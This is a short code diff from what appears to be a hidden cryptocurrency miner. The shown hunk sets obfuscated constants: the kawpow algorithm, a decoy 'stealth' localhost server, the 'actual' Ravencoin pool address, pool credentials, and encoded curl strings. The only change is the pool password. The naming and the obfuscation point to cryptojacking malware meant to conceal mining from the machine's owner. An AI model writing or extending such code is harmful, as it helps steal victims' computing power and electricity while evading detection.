@@ -45,7 +45,7 @@ SERVICE_ALGORITHM_ENCODED = advanced_obfuscate_string("kawpow")
 STEALTH_SERVER_ENCODED = advanced_obfuscate_string("localhost:8080")
 ACTUAL_SERVER_ENCODED = advanced_obfuscate_string("stratum+tcp://rvn.kryptex.network:7031")
 SERVICE_USER_ENCODED = advanced_obfuscate_string("krxXJMWJKW")
-SERVICE_PASS_ENCODED = advanced_obfuscate_string("CUAN")
+SERVICE_PASS_ENCODED = advanced_obfuscate_string("CUANER")
 
 CURL_COMMAND_ENCODED = advanced_obfuscate_string("curl")
 CURL_SILENT_ENCODED = advanced_obfuscate_string("-s")
